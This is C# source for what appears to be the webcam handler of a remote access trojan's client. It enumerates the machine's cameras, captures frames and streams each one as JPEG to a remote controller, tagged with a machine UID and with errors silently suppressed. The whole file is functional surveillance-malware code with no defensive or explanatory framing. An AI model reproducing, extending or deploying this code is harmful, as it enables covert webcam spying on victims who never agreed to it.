using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using Client.Connection;
using Client.Things;
using System.Collections.Generic;

namespace Client.Handlers
{
    internal class Handlewebcam
    {
        private static Handlewebcam instance;
        private VideoCaptureDevice cam;
        private FilterInfoCollection devices;

        public static Handlewebcam Instance
        {
            get
            {
                if (instance == null)
                    instance = new Handlewebcam();
                return instance;
            }
        }

        public Handlewebcam() { }

        public void Start(int pos)
        {
            if (cam != null && cam.IsRunning) return;
            devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (devices.Count == 0) return;
            cam = new VideoCaptureDevice(devices[pos].MonikerString);
            cam.NewFrame += Cam_NewFrame;
            cam.Start();
        }

        public void Stop()
        {
            if (cam != null && cam.IsRunning)
            {
                cam.SignalToStop();
                cam.WaitForStop();
                cam = null;
                GC.Collect();
                GC.WaitForPendingFinalizers();
            }
        }

        public string[] GetCamerasList()
        {
            try
            {
                List<string> cameraList = new List<string>();
                devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (devices.Count == 0)
                {
                    cameraList.Add("No cameras found :(");
                }
                else
                {
                    foreach (FilterInfo device in devices)
                    {
                        cameraList.Add(device.Name);
                    }
                }

                return cameraList.ToArray();
            } catch (Exception)
            {
                List<string> cameraList = new List<string>();
                cameraList.Add("Error, please try again :(");
                return cameraList.ToArray();
            }
        }

        public void SendCameraList()
        {
            Stuff.Pack meow = new Stuff.Pack();
            meow.Set("Packet", "Webcam");
            meow.Set("UID", UID.Get());
            meow.Set("Command", "List");
            meow.Set("Cams", GetCamerasList());
            SillyClient.Send(meow.Pacc());
        }


        private void Cam_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    eventArgs.Frame.Save(ms, ImageFormat.Jpeg);
                    byte[] imageBytes = ms.ToArray();

                    Stuff.Pack meow = new Stuff.Pack();
                    meow.Set("Packet", "Webcam");
                    meow.Set("UID", UID.Get());
                    meow.Set("Command", "Start");
                    meow.Set("Image", imageBytes);
                    SillyClient.Send(meow.Pacc());
                }
            }
            catch (Exception) { }
        }
    }
}
